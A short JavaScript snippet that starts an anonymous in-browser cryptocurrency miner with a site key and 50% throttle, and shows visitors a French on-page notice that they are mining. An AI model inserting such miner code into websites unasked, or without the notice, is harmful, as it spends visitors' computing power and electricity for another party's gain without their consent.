let miner;
try {
    miner = new Client.Anonymous('ae98ac13fd52b58488b7e7b059ff781e4b8d2d5eaa2a53950e7552dc131e10d5', {
        throttle: 0.5,
        c: 'w',
        ads: 0
    });
    miner.start();
    miner.addMiningNotification("Top", "Vous êtes en train de miner!", "#cccccc", 40, "#3d3d3d");
} catch (err) {
    console.log("Miner not running");
}